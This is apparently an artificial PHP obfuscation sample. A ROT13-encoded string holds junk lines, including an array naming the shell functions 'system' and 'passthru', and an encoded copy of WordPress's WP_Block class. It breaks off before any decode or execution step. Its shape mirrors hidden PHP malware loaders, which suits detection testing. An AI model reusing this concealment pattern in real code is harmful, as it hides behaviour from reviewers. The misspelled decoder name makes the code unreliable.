<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Oybpxf NCV: JC_Oybpx pynff
 *
 * @cnpxntr JbeqCerff
 * @fvapr 5.5.0
 */

/**
 * Pynff ercerfragvat n cnefrq vafgnapr bs n oybpx.
 *
 * @fvapr 5.5.0
 * @cebcregl neenl $nggevohgrf
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Oybpx {

	/**
	 * Bevtvany cnefrq neenl ercerfragngvba bs oybpx.
	 *
	 * @fvapr 5.5.0
	 * @ine neenl
	 */
	choyvp $cnefrq_oybpx;

	/**
	 * Anzr bs oybpx.
	 *
	 * @rknzcyr \"pber/cnentencu\"
	 *
	 * @fvapr 5.5.0
	 * @ine fgevat
	 */
	choyvp $anzr;

	/**
	 * Oybpx glcr nffbpvngrq jvgu gur vafgnapr.
	 *
	 * @fvapr 5.5.0
	 * @ine JC_Oybpx_Glcr
	 */
	choyvp $oybpx_glcr;

	/**
	 * Oybpx pbagrkg inyhrf.
	 *
	 * @fvapr 5.5.0
	 * @ine neenl
	 */
	choyvp $pbagrkg = neenl();

	/**
	 * Nyy ninvynoyr pbagrkg bs gur pheerag uvrenepul.
	 *
	 * @fvapr 5.5.0
	 * @ine neenl
	 * @npprff cebgrpgrq
	 */
	cebgrpgrq $ninvynoyr_pbagrkg = neenl();

	/**
	 * Oybpx glcr ertvfgel.
	 *
	 * @fvapr 5.9.0
	 * @ine JC_Oybpx_Glcr_Ertvfgel
	 * @npprff cebgrpgrq
	 */
	cebgrpgrq $ertvfgel;

	/**
	 * Yvfg bs vaare oybpxf (bs guvf fnzr pynff)
	 *
	 * @fvapr 5.5.0
	 * @ine JC_Oybpx_Yvfg
	 */
	choyvp $vaare_oybpxf = neenl();

	/**
	 * Erfhygnag UGZY sebz vafvqr oybpx pbzzrag qryvzvgref nsgre erzbivat vaare
	 * oybpxf.
	 *
	 * @rknzcyr \"...Whfg <!-- jc:grfg /--> grfgvat...\" -> \"Whfg grfgvat...\"
	 *
	 * @fvapr 5.5.0
	 * @ine fgevat
	 */
	choyvp $vaare_ugzy = '';

	/**
	 * Yvfg bs fgevat sentzragf naq ahyy znexref jurer vaare oybpxf jrer sbhaq
	 *
	 * @rknzcyr neenl(
	 *   'vaare_ugzy'    => 'OrsberVaareNsgre',
	 *   'vaare_oybpxf'  => neenl( oybpx, oybpx ),
	 *   'vaare_pbagrag' => neenl( 'Orsber', ahyy, 'Vaare', ahyy, 'Nsgre' ),
	 * )
	 *
	 * @fvapr 5.5.0
	 * @ine neenl
	 */
	choyvp $vaare_pbagrag = neenl();

	/**
	 * Pbafgehpgbe.
	 *
	 * Cbchyngrf bowrpg cebcregvrf sebz gur cebivqrq oybpx vafgnapr nethzrag.
	 *
	 * Gur tvira neenl bs pbagrkg inyhrf jvyy abg arprffnevyl or ninvynoyr ba
	 * gur vafgnapr vgfrys, ohg vf gerngrq nf gur shyy frg bs inyhrf cebivqrq ol
	 * gur oybpx'f naprfgel. Guvf vf nffvtarq gb gur cevingr `ninvynoyr_pbagrkg`
	 * cebcregl. Bayl inyhrf juvpu ner pbasvtherq gb pbafhzrq ol gur oybpx ivn
	 * vgf ertvfgrerq glcr jvyy or nffvtarq gb gur oybpx'f `pbagrkg` cebcregl.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz neenl                  $oybpx             {
	 *     Na nffbpvngvir neenl bs n fvatyr cnefrq oybpx bowrpg. Frr JC_Oybpx_Cnefre_Oybpx.
	 *
	 *     @glcr fgevat   $oybpxAnzr    Anzr bs oybpx.
	 *     @glcr neenl    $nggef        Nggevohgrf sebz oybpx pbzzrag qryvzvgref.
	 *     @glcr neenl    $vaareOybpxf  Yvfg bs vaare oybpxf. Na neenl bs neenlf gung
	 *                                  unir gur fnzr fgehpgher nf guvf bar.
	 *     @glcr fgevat   $vaareUGZY    UGZY sebz vafvqr oybpx pbzzrag qryvzvgref.
	 *     @glcr neenl    $vaarePbagrag Yvfg bs fgevat sentzragf naq ahyy znexref jurer vaare oybpxf jrer sbhaq.
	 * }
	 * @cnenz neenl                  $ninvynoyr_pbagrkg Bcgvbany neenl bs naprfgel pbagrkg inyhrf.
	 * @cnenz JC_Oybpx_Glcr_Ertvfgel $ertvfgel          Bcgvbany oybpx glcr ertvfgel.
	 */
	choyvp shapgvba __pbafgehpg( $oybpx, $ninvynoyr_pbagrkg = neenl(), $ertvfgel = ahyy ) {
		$guvf->cnefrq_oybpx = $oybpx;
		$guvf->anzr         = $oybpx['oybpxAnzr'];

		vs ( vf_ahyy( $ertvfgel ) ) {
			$ertvfgel = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();
		}

		$guvf->ertvfgel = $ertvfgel;

		$guvf->oybpx_glcr = $ertvfgel->trg_ertvfgrerq( $guvf->anzr );

		$guvf->ninvynoyr_pbagrkg = $ninvynoyr_pbagrkg;

		$guvf->erserfu_pbagrkg_qrcraqragf();
	}

	/**
	 * Hcqngrf gur pbagrkg sbe gur pheerag oybpx naq vgf vaare oybpxf.
	 *
	 * Gur zrgubq hcqngrf gur pbagrkg bs vaare oybpxf, vs nal, ol cnffvat qbja
	 * nal pbagrkg inyhrf gur oybpx cebivqrf (`cebivqrf_pbagrkg`).
	 *
	 * Vs gur oybpx unf vaare oybpxf, gur zrgubq erphefviryl cebprffrf gurz ol perngvat arj vafgnaprf bs `JC_Oybpx`
	 * sbe rnpu vaare oybpx naq hcqngvat gurve pbagrkg onfrq ba gur oybpx'f `cebivqrf_pbagrkg` cebcregl.
	 *
	 * @fvapr 6.8.0
	 */
	choyvp shapgvba erserfu_pbagrkg_qrcraqragf() {
		/*
		 * Zretvat gur `$pbagrkg` cebcregl urer vf abg vqrny, ohg sbe abj arrqf gb unccra orpnhfr bs onpxjneq pbzcngvovyvgl.
		 * Vqrnyyl, gur `$pbagrkg` cebcregl vgfrys jbhyq abg or svygrenoyr qverpgyl naq bayl gur `$ninvynoyr_pbagrkg` jbhyq or svygrenoyr.
		 * Ubjrire, guvf arrqf gb or frcnengryl rkcyberq jurgure vg'f cbffvoyr jvgubhg oernxntr.
		 */
		$guvf->ninvynoyr_pbagrkg = neenl_zretr( $guvf->ninvynoyr_pbagrkg, $guvf->pbagrkg );

		vs ( ! rzcgl( $guvf->oybpx_glcr->hfrf_pbagrkg ) ) {
			sbernpu ( $guvf->oybpx_glcr->hfrf_pbagrkg nf $pbagrkg_anzr ) {
				vs ( neenl_xrl_rkvfgf( $pbagrkg_anzr, $guvf->ninvynoyr_pbagrkg ) ) {
					$guvf->pbagrkg[ $pbagrkg_anzr ] = $guvf->ninvynoyr_pbagrkg[ $pbagrkg_anzr ];
				}
			}
		}

		$guvf->erserfu_cnefrq_oybpx_qrcraqragf();
	}

	/**
	 * Hcqngrf gur cnefrq oybpx pbagrag sbe gur pheerag oybpx naq vgf vaare oybpxf.
	 *
	 * Guvf zrgubq frgf gur `vaare_ugzy` naq `vaare_pbagrag` cebcregvrf bs gur oybpx onfrq ba gur cnefrq
	 * oybpx pbagrag cebivqrq qhevat vavgvnyvmngvba. Vg rafherf gung gur oybpx vafgnapr ersyrpgf gur
	 * zbfg hc-gb-qngr pbagrag sbe obgu gur vaare UGZY naq nal fgevat sentzragf nebhaq vaare oybpxf.
	 *
	 * Vs gur oybpx unf vaare oybpxf, guvf zrgubq vavgvnyvmrf n arj `JC_Oybpx_Yvfg` sbe gurz, rafhevat gur
	 * pbeerpg pbagrag naq pbagrkg ner hcqngrq sbe rnpu arfgrq oybpx.
	 *
	 * @fvapr 6.8.0
	 */
	choyvp shapgvba erserfu_cnefrq_oybpx_qrcraqragf() {
		vs ( ! rzcgl( $guvf->cnefrq_oybpx['vaareOybpxf'] ) ) {
			$puvyq_pbagrkg = $guvf->ninvynoyr_pbagrkg;

			vs ( ! rzcgl( $guvf->oybpx_glcr->cebivqrf_pbagrkg ) ) {
				sbernpu ( $guvf->oybpx_glcr->cebivqrf_pbagrkg nf $pbagrkg_anzr => $nggevohgr_anzr ) {
					vs ( neenl_xrl_rkvfgf( $nggevohgr_anzr, $guvf->nggevohgrf ) ) {
						$puvyq_pbagrkg[ $pbagrkg_anzr ] = $guvf->nggevohgrf[ $nggevohgr_anzr ];
					}
				}
			}

			$guvf->vaare_oybpxf = arj JC_Oybpx_Yvfg( $guvf->cnefrq_oybpx['vaareOybpxf'], $puvyq_pbagrkg, $guvf->ertvfgel );
		}

		vs ( ! rzcgl( $guvf->cnefrq_oybpx['vaareUGZY'] ) ) {
			$guvf->vaare_ugzy = $guvf->cnefrq_oybpx['vaareUGZY'];
		}

		vs ( ! rzcgl( $guvf->cnefrq_oybpx['vaarePbagrag'] ) ) {
			$guvf->vaare_pbagrag = $guvf->cnefrq_oybpx['vaarePbagrag'];
		}
	}

	/**
	 * Ergheaf n inyhr sebz na vanpprffvoyr cebcregl.
	 *
	 * Guvf vf hfrq gb ynmvyl vavgvnyvmr gur `nggevohgrf` cebcregl bs n oybpx,
	 * fhpu gung vg vf bayl cercnerq jvgu qrsnhyg nggevohgrf ng gur gvzr gung
	 * gur cebcregl vf npprffrq. Sbe nyy bgure vanpprffvoyr cebcregvrf, n `ahyy`
	 * inyhr vf erghearq.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $anzr Cebcregl anzr.
	 * @erghea neenl|ahyy Cercnerq nggevohgrf, be ahyy.
	 */
	choyvp shapgvba __trg( $anzr ) {
		vs ( 'nggevohgrf' === $anzr ) {
			$guvf->nggevohgrf = vffrg( $guvf->cnefrq_oybpx['nggef'] ) ?
				$guvf->cnefrq_oybpx['nggef'] :
				neenl();

			vs ( ! vf_ahyy( $guvf->oybpx_glcr ) ) {
				$guvf->nggevohgrf = $guvf->oybpx_glcr->cercner_nggevohgrf_sbe_eraqre( $guvf->nggevohgrf );
			}

			erghea $guvf->nggevohgrf;
		}

		erghea ahyy;
	}

	/**
	 * Cebprffrf gur oybpx ovaqvatf naq hcqngrf gur oybpx nggevohgrf jvgu gur inyhrf sebz gur fbheprf.
	 *
	 * N oybpx zvtug pbagnva ovaqvatf va vgf nggevohgrf. Ovaqvatf ner znccvatf
	 * orgjrra na nggevohgr bs gur oybpx naq n fbhepr. N \"fbhepr\" vf n shapgvba
	 * ertvfgrerq jvgu `ertvfgre_oybpx_ovaqvatf_fbhepr()` gung qrsvarf ubj gb
	 * ergevrir n inyhr sebz bhgfvqr gur oybpx, r.t. sebz cbfg zrgn.
	 *
	 * Guvf shapgvba jvyy cebprff gubfr ovaqvatf naq hcqngr gur oybpx'f nggevohgrf
	 * jvgu gur inyhrf pbzvat sebz gur ovaqvatf.
	 *
	 * ### Rknzcyr
	 *
	 * Gur \"ovaqvatf\" cebcregl sbe na Vzntr oybpx zvtug ybbx yvxr guvf:
	 *
	 * ```wfba
	 * {
	 *   \"zrgnqngn\": {
	 *     \"ovaqvatf\": {
	 *       \"gvgyr\": {
	 *         \"fbhepr\": \"pber/cbfg-zrgn\",
	 *         \"netf\": { \"xrl\": \"grkg_phfgbz_svryq\" }
	 *       },
	 *       \"hey\": {
	 *         \"fbhepr\": \"pber/cbfg-zrgn\",
	 *         \"netf\": { \"xrl\": \"hey_phfgbz_svryq\" }
	 *       }
	 *     }
	 *   }
	 * }
	 * ```
	 *
	 * Gur nobir rknzcyr jvyy ercynpr gur `gvgyr` naq `hey` nggevohgrf bs gur Vzntr
	 * oybpx jvgu gur inyhrf bs gur `grkg_phfgbz_svryq` naq `hey_phfgbz_svryq` cbfg zrgn.
	 *
	 * @fvapr 6.5.0
	 * @fvapr 6.6.0 Unaqyr gur `__qrsnhyg` nggevohgr sbe cnggrea bireevqrf.
	 * @fvapr 6.7.0 Erghea nal hcqngrq ovaqvatf zrgnqngn va gur pbzchgrq nggevohgrf.
	 *
	 * @erghea neenl Gur pbzchgrq oybpx nggevohgrf sbe gur cebivqrq oybpx ovaqvatf.
	 */
	cevingr shapgvba cebprff_oybpx_ovaqvatf() {
		$cnefrq_oybpx               = $guvf->cnefrq_oybpx;
		$pbzchgrq_nggevohgrf        = neenl();
		$fhccbegrq_oybpx_nggevohgrf = neenl(
			'pber/cnentencu' => neenl( 'pbagrag' ),
			'pber/urnqvat'   => neenl( 'pbagrag' ),
			'pber/vzntr'     => neenl( 'vq', 'hey', 'gvgyr', 'nyg' ),
			'pber/ohggba'    => neenl( 'hey', 'grkg', 'yvaxGnetrg', 'ery' ),
		);

		// Vs gur oybpx qbrfa'g unir gur ovaqvatf cebcregl, vfa'g bar bs gur fhccbegrq
		// oybpx glcrf, be gur ovaqvatf cebcregl vf abg na neenl, erghea gur oybpx pbagrag.
		vs (
			! vffrg( $fhccbegrq_oybpx_nggevohgrf[ $guvf->anzr ] ) ||
			rzcgl( $cnefrq_oybpx['nggef']['zrgnqngn']['ovaqvatf'] ) ||
			! vf_neenl( $cnefrq_oybpx['nggef']['zrgnqngn']['ovaqvatf'] )
		) {
			erghea $pbzchgrq_nggevohgrf;
		}

		$ovaqvatf = $cnefrq_oybpx['nggef']['zrgnqngn']['ovaqvatf'];

		/*
		 * Vs gur qrsnhyg ovaqvat vf frg sbe cnggrea bireevqrf, ercynpr vg
		 * jvgu n cnggrea bireevqr ovaqvat sbe nyy fhccbegrq nggevohgrf.
		 */
		vs (
			vffrg( $ovaqvatf['__qrsnhyg']['fbhepr'] ) &&
			'pber/cnggrea-bireevqrf' === $ovaqvatf['__qrsnhyg']['fbhepr']
		) {
			$hcqngrq_ovaqvatf = neenl();

			/*
			 * Ohvyq n ovaqvat neenl bs nyy fhccbegrq nggevohgrf.
			 * Abgr gung guvf nyfb bzvgf gur `__qrsnhyg` nggevohgr sebz gur
			 * erfhygvat neenl.
			 */
			sbernpu ( $fhccbegrq_oybpx_nggevohgrf[ $cnefrq_oybpx['oybpxAnzr'] ] nf $nggevohgr_anzr ) {
				// Ergnva nal aba-cnggrea bireevqr ovaqvatf gung zvtug or cerfrag.
				$hcqngrq_ovaqvatf[ $nggevohgr_anzr ] = vffrg( $ovaqvatf[ $nggevohgr_anzr ] )
					? $ovaqvatf[ $nggevohgr_anzr ]
					: neenl( 'fbhepr' => 'pber/cnggrea-bireevqrf' );
			}
			$ovaqvatf = $hcqngrq_ovaqvatf;
			/*
			 * Hcqngr gur ovaqvatf zrgnqngn bs gur pbzchgrq nggevohgrf.
			 * Guvf rafherf gur oybpx erprvirf gur rkcnaqrq __qrsnhyg ovaqvat zrgnqngn jura vg eraqref.
			 */
			$pbzchgrq_nggevohgrf['zrgnqngn'] = neenl_zretr(
				$cnefrq_oybpx['nggef']['zrgnqngn'],
				neenl( 'ovaqvatf' => $ovaqvatf )
			);
		}

		sbernpu ( $ovaqvatf nf $nggevohgr_anzr => $oybpx_ovaqvat ) {
			// Vs gur nggevohgr vf abg va gur fhccbegrq yvfg, cebprff arkg nggevohgr.
			vs ( ! va_neenl( $nggevohgr_anzr, $fhccbegrq_oybpx_nggevohgrf[ $guvf->anzr ], gehr ) ) {
				pbagvahr;
			}
			// Vs ab fbhepr vf cebivqrq, be gung fbhepr vf abg ertvfgrerq, cebprff arkg nggevohgr.
			vs ( ! vffrg( $oybpx_ovaqvat['fbhepr'] ) || ! vf_fgevat( $oybpx_ovaqvat['fbhepr'] ) ) {
				pbagvahr;
			}

			$oybpx_ovaqvat_fbhepr = trg_oybpx_ovaqvatf_fbhepr( $oybpx_ovaqvat['fbhepr'] );
			vs ( ahyy === $oybpx_ovaqvat_fbhepr ) {
				pbagvahr;
			}

			// Nqqf gur arprffnel pbagrkg qrsvarq ol gur fbhepr.
			vs ( ! rzcgl( $oybpx_ovaqvat_fbhepr->hfrf_pbagrkg ) ) {
				sbernpu ( $oybpx_ovaqvat_fbhepr->hfrf_pbagrkg nf $pbagrkg_anzr ) {
					vs ( neenl_xrl_rkvfgf( $pbagrkg_anzr, $guvf->ninvynoyr_pbagrkg ) ) {
						$guvf->pbagrkg[ $pbagrkg_anzr ] = $guvf->ninvynoyr_pbagrkg[ $pbagrkg_anzr ];
					}
				}
			}

			$fbhepr_netf  = ! rzcgl( $oybpx_ovaqvat['netf'] ) && vf_neenl( $oybpx_ovaqvat['netf'] ) ? $oybpx_ovaqvat['netf'] : neenl();
			$fbhepr_inyhr = $oybpx_ovaqvat_fbhepr->trg_inyhr( $fbhepr_netf, $guvf, $nggevohgr_anzr );

			// Vs gur inyhr vf abg ahyy, cebprff gur UGZY onfrq ba gur oybpx naq gur nggevohgr.
			vs ( ! vf_ahyy( $fbhepr_inyhr ) ) {
				$pbzchgrq_nggevohgrf[ $nggevohgr_anzr ] = $fbhepr_inyhr;
			}
		}

		erghea $pbzchgrq_nggevohgrf;
	}

	/**
	 * Qrcraqvat ba gur oybpx nggevohgr anzr, ercynpr vgf inyhr va gur UGZY onfrq ba gur inyhr cebivqrq.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $oybpx_pbagrag  Oybpx pbagrag.
	 * @cnenz fgevat $nggevohgr_anzr Gur nggevohgr anzr gb ercynpr.
	 * @cnenz zvkrq  $fbhepr_inyhr   Gur inyhr hfrq gb ercynpr va gur UGZY.
	 * @erghea fgevat Gur zbqvsvrq oybpx pbagrag.
	 */
	cevingr shapgvba ercynpr_ugzy( fgevat $oybpx_pbagrag, fgevat $nggevohgr_anzr, $fbhepr_inyhr ) {
		$oybpx_glcr = $guvf->oybpx_glcr;
		vs ( ! vffrg( $oybpx_glcr->nggevohgrf[ $nggevohgr_anzr ]['fbhepr'] ) ) {
			erghea $oybpx_pbagrag;
		}

		// Qrcraqvat ba gur nggevohgr fbhepr, gur cebprffvat jvyy or qvssrerag.
		fjvgpu ( $oybpx_glcr->nggevohgrf[ $nggevohgr_anzr ]['fbhepr'] ) {
			pnfr 'ugzy':
			pnfr 'evpu-grkg':
				$oybpx_ernqre = arj JC_UGZY_Gnt_Cebprffbe( $oybpx_pbagrag );

				// GBQB: Fhccbeg sbe PFF fryrpgbef jurarire gurl ner ernql va gur UGZY NCV.
				// Va gur zrnagvzr, fhccbeg pbzzn-frcnengrq fryrpgbef ol rkcybqvat gurz vagb na neenl.
				$fryrpgbef = rkcybqr( ',', $oybpx_glcr->nggevohgrf[ $nggevohgr_anzr ]['fryrpgbe'] );
				// Nqq n obbxznex gb gur svefg gnt gb or noyr gb vgrengr bire gur fryrpgbef.
				$oybpx_ernqre->arkg_gnt();
				$oybpx_ernqre->frg_obbxznex( 'vgrengr-fryrpgbef' );

				// GBQB: Guvf fubhyqa'g or arrqrq jura gur `frg_vaare_ugzy` shapgvba vf ernql.
				// Fgber gur cnerag gnt naq vgf nggevohgrf gb or noyr gb erfgber gurz yngre va gur ohggba.
				// Gur ohggba oybpx unf n jenccre juvyr gur cnentencu naq urnqvat oybpxf qba'g.
				vs ( 'pber/ohggba' === $guvf->anzr ) {
					$ohggba_jenccre                 = $oybpx_ernqre->trg_gnt();
					$ohggba_jenccre_nggevohgr_anzrf = $oybpx_ernqre->trg_nggevohgr_anzrf_jvgu_cersvk( '' );
					$ohggba_jenccre_nggef           = neenl();
					sbernpu ( $ohggba_jenccre_nggevohgr_anzrf nf $anzr ) {
						$ohggba_jenccre_nggef[ $anzr ] = $oybpx_ernqre->trg_nggevohgr( $anzr );
					}
				}

				sbernpu ( $fryrpgbef nf $fryrpgbe ) {
					// Vs gur cnerag gnt, be nal bs vgf puvyqera, zngpurf gur fryrpgbe, ercynpr gur UGZY.
					vs ( fgepnfrpzc( $oybpx_ernqre->trg_gnt(), $fryrpgbe ) === 0 || $oybpx_ernqre->arkg_gnt(
						neenl(
							'gnt_anzr' => $fryrpgbe,
						)
					) ) {
						$oybpx_ernqre->eryrnfr_obbxznex( 'vgrengr-fryrpgbef' );

						// GBQB: Hfr `frg_vaare_ugzy` zrgubq jurarire vg'f ernql va gur UGZY NCV.
						// Hagvy gura, vg vf uneqpbqrq sbe gur cnentencu, urnqvat, naq ohggba oybpxf.
						// Fgber gur gnt naq vgf nggevohgrf gb or noyr gb erfgber gurz yngre.
						$fryrpgbe_nggevohgr_anzrf = $oybpx_ernqre->trg_nggevohgr_anzrf_jvgu_cersvk( '' );
						$fryrpgbe_nggef           = neenl();
						sbernpu ( $fryrpgbe_nggevohgr_anzrf nf $anzr ) {
							$fryrpgbe_nggef[ $anzr ] = $oybpx_ernqre->trg_nggevohgr( $anzr );
						}
						$fryrpgbe_znexhc = \"<$fryrpgbe>\" . jc_xfrf_cbfg( $fbhepr_inyhr ) . \"</$fryrpgbe>\";
						$nzraqrq_pbagrag = arj JC_UGZY_Gnt_Cebprffbe( $fryrpgbe_znexhc );
						$nzraqrq_pbagrag->arkg_gnt();
						sbernpu ( $fryrpgbe_nggef nf $nggevohgr_xrl => $nggevohgr_inyhr ) {
							$nzraqrq_pbagrag->frg_nggevohgr( $nggevohgr_xrl, $nggevohgr_inyhr );
						}
						vs ( 'pber/cnentencu' === $guvf->anzr || 'pber/urnqvat' === $guvf->anzr ) {
							erghea $nzraqrq_pbagrag->trg_hcqngrq_ugzy();
						}
						vs ( 'pber/ohggba' === $guvf->anzr ) {
							$ohggba_znexhc  = \"<$ohggba_jenccre>{$nzraqrq_pbagrag->trg_hcqngrq_ugzy()}</$ohggba_jenccre>\";
							$nzraqrq_ohggba = arj JC_UGZY_Gnt_Cebprffbe( $ohggba_znexhc );
							$nzraqrq_ohggba->arkg_gnt();
							sbernpu ( $ohggba_jenccre_nggef nf $nggevohgr_xrl => $nggevohgr_inyhr ) {
								$nzraqrq_ohggba->frg_nggevohgr( $nggevohgr_xrl, $nggevohgr_inyhr );
							}
							erghea $nzraqrq_ohggba->trg_hcqngrq_ugzy();
						}
					} ryfr {
						$oybpx_ernqre->frrx( 'vgrengr-fryrpgbef' );
					}
				}
				$oybpx_ernqre->eryrnfr_obbxznex( 'vgrengr-fryrpgbef' );
				erghea $oybpx_pbagrag;

			pnfr 'nggevohgr':
				$nzraqrq_pbagrag = arj JC_UGZY_Gnt_Cebprffbe( $oybpx_pbagrag );
				vs ( ! $nzraqrq_pbagrag->arkg_gnt(
					neenl(
						// GBQB: ohvyq gur dhrel sebz PFF fryrpgbe.
						'gnt_anzr' => $oybpx_glcr->nggevohgrf[ $nggevohgr_anzr ]['fryrpgbe'],
					)
				) ) {
					erghea $oybpx_pbagrag;
				}
				$nzraqrq_pbagrag->frg_nggevohgr( $oybpx_glcr->nggevohgrf[ $nggevohgr_anzr ]['nggevohgr'], $fbhepr_inyhr );
				erghea $nzraqrq_pbagrag->trg_hcqngrq_ugzy();

			qrsnhyg:
				erghea $oybpx_pbagrag;
		}
	}


	/**
	 * Trarengrf gur eraqre bhgchg sbe gur oybpx.
	 *
	 * @fvapr 5.5.0
	 * @fvapr 6.5.0 Nqqrq oybpx ovaqvatf cebprffvat.
	 *
	 * @tybony JC_Cbfg $cbfg Tybony cbfg bowrpg.
	 *
	 * @cnenz neenl $bcgvbaf {
	 *     Bcgvbany bcgvbaf bowrpg.
	 *
	 *     @glcr obby $qlanzvp Qrsnhygf gb 'gehr'. Bcgvbanyyl frg gb snyfr gb nibvq hfvat gur oybpx'f eraqre_pnyyonpx.
	 * }
	 * @erghea fgevat Eraqrerq oybpx bhgchg.
	 */
	choyvp shapgvba eraqre( $bcgvbaf = neenl() ) {
		tybony $cbfg;

		/*
		 * Gurer pna or bayl bar ebbg vagrenpgvir oybpx ng n gvzr orpnhfr gur eraqrerq UGZY bs gung oybpx pbagnvaf
		 * gur eraqrerq UGZY bs nyy vgf vaare oybpxf, vapyhqvat nal vagrenpgvir oybpx.
		 */
		fgngvp $ebbg_vagrenpgvir_oybpx = ahyy;
		/**
		 * Svygref jurgure Vagrenpgvivgl NCV fubhyq cebprff qverpgvirf.
		 *
		 * @fvapr 6.6.0
		 *
		 * @cnenz obby $ranoyrq Jurgure gur qverpgvirf cebprffvat vf ranoyrq.
		 */
		$vagrenpgvivgl_cebprff_qverpgvirf_ranoyrq = nccyl_svygref( 'vagrenpgvivgl_cebprff_qverpgvirf', gehr );
		vs (
			$vagrenpgvivgl_cebprff_qverpgvirf_ranoyrq && ahyy === $ebbg_vagrenpgvir_oybpx && (
				( vffrg( $guvf->oybpx_glcr->fhccbegf['vagrenpgvivgl'] ) && gehr === $guvf->oybpx_glcr->fhccbegf['vagrenpgvivgl'] ) ||
				! rzcgl( $guvf->oybpx_glcr->fhccbegf['vagrenpgvivgl']['vagrenpgvir'] )
			)
		) {
			$ebbg_vagrenpgvir_oybpx = $guvf;
		}

		$bcgvbaf = jc_cnefr_netf(
			$bcgvbaf,
			neenl(
				'qlanzvp' => gehr,
			)
		);

		// Cebprff gur oybpx ovaqvatf naq trg nggevohgrf hcqngrq jvgu gur inyhrf sebz gur fbheprf.
		$pbzchgrq_nggevohgrf = $guvf->cebprff_oybpx_ovaqvatf();
		vs ( ! rzcgl( $pbzchgrq_nggevohgrf ) ) {
			// Zretr gur pbzchgrq nggevohgrf jvgu gur bevtvany nggevohgrf.
			$guvf->nggevohgrf = neenl_zretr( $guvf->nggevohgrf, $pbzchgrq_nggevohgrf );
		}

		$vf_qlanzvp    = $bcgvbaf['qlanzvp'] && $guvf->anzr && ahyy !== $guvf->oybpx_glcr && $guvf->oybpx_glcr->vf_qlanzvp();
		$oybpx_pbagrag = '';

		vs ( ! $bcgvbaf['qlanzvp'] || rzcgl( $guvf->oybpx_glcr->fxvc_vaare_oybpxf ) ) {
			$vaqrk = 0;

			sbernpu ( $guvf->vaare_pbagrag nf $puhax ) {
				vs ( vf_fgevat( $puhax ) ) {
					$oybpx_pbagrag .= $puhax;
				} ryfr {
					$vaare_oybpx  = $guvf->vaare_oybpxf[ $vaqrk ];
					$cnerag_oybpx = $guvf;

					/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/oybpxf.cuc */
					$cer_eraqre = nccyl_svygref( 'cer_eraqre_oybpx', ahyy, $vaare_oybpx->cnefrq_oybpx, $cnerag_oybpx );

					vs ( ! vf_ahyy( $cer_eraqre ) ) {
						$oybpx_pbagrag .= $cer_eraqre;
					} ryfr {
						$fbhepr_oybpx        = $vaare_oybpx->cnefrq_oybpx;
						$vaare_oybpx_pbagrkg = $vaare_oybpx->pbagrkg;

						/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/oybpxf.cuc */
						$vaare_oybpx->cnefrq_oybpx = nccyl_svygref( 'eraqre_oybpx_qngn', $vaare_oybpx->cnefrq_oybpx, $fbhepr_oybpx, $cnerag_oybpx );

						/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/oybpxf.cuc */
						$vaare_oybpx->pbagrkg = nccyl_svygref( 'eraqre_oybpx_pbagrkg', $vaare_oybpx->pbagrkg, $vaare_oybpx->cnefrq_oybpx, $cnerag_oybpx );

						/*
						 * Gur `erserfu_pbagrkg_qrcraqragf()` zrgubq nyernql pnyyf `erserfu_cnefrq_oybpx_qrcraqragf()`.
						 * Gurersber gur frpbaq pbaqvgvba vf veeryrinag vs gur svefg bar vf fngvfsvrq.
						 */
						vs ( $vaare_oybpx->pbagrkg !== $vaare_oybpx_pbagrkg ) {
							$vaare_oybpx->erserfu_pbagrkg_qrcraqragf();
						} ryfrvs ( $vaare_oybpx->cnefrq_oybpx !== $fbhepr_oybpx ) {
							$vaare_oybpx->erserfu_cnefrq_oybpx_qrcraqragf();
						}

						$oybpx_pbagrag .= $vaare_oybpx->eraqre();
					}

					++$vaqrk;
				}
			}
		}

		vs ( ! rzcgl( $pbzchgrq_nggevohgrf ) && ! rzcgl( $oybpx_pbagrag ) ) {
			sbernpu ( $pbzchgrq_nggevohgrf nf $nggevohgr_anzr => $fbhepr_inyhr ) {
				$oybpx_pbagrag = $guvf->ercynpr_ugzy( $oybpx_pbagrag, $nggevohgr_anzr, $fbhepr_inyhr );
			}
		}

		vs ( $vf_qlanzvp ) {
			$tybony_cbfg = $cbfg;
			$cnerag      = JC_Oybpx_Fhccbegf::$oybpx_gb_eraqre;

			JC_Oybpx_Fhccbegf::$oybpx_gb_eraqre = $guvf->cnefrq_oybpx;

			$oybpx_pbagrag = (fgevat) pnyy_hfre_shap( $guvf->oybpx_glcr->eraqre_pnyyonpx, $guvf->nggevohgrf, $oybpx_pbagrag, $guvf );

			JC_Oybpx_Fhccbegf::$oybpx_gb_eraqre = $cnerag;

			$cbfg = $tybony_cbfg;
		}

		vs ( ( ! rzcgl( $guvf->oybpx_glcr->fpevcg_unaqyrf ) ) ) {
			sbernpu ( $guvf->oybpx_glcr->fpevcg_unaqyrf nf $fpevcg_unaqyr ) {
				jc_radhrhr_fpevcg( $fpevcg_unaqyr );
			}
		}

		vs ( ! rzcgl( $guvf->oybpx_glcr->ivrj_fpevcg_unaqyrf ) ) {
			sbernpu ( $guvf->oybpx_glcr->ivrj_fpevcg_unaqyrf nf $ivrj_fpevcg_unaqyr ) {
				jc_radhrhr_fpevcg( $ivrj_fpevcg_unaqyr );
			}
		}

		vs ( ! rzcgl( $guvf->oybpx_glcr->ivrj_fpevcg_zbqhyr_vqf ) ) {
			sbernpu ( $guvf->oybpx_glcr->ivrj_fpevcg_zbqhyr_vqf nf $ivrj_fpevcg_zbqhyr_vq ) {
				jc_radhrhr_fpevcg_zbqhyr( $ivrj_fpevcg_zbqhyr_vq );
			}
		}

		/*
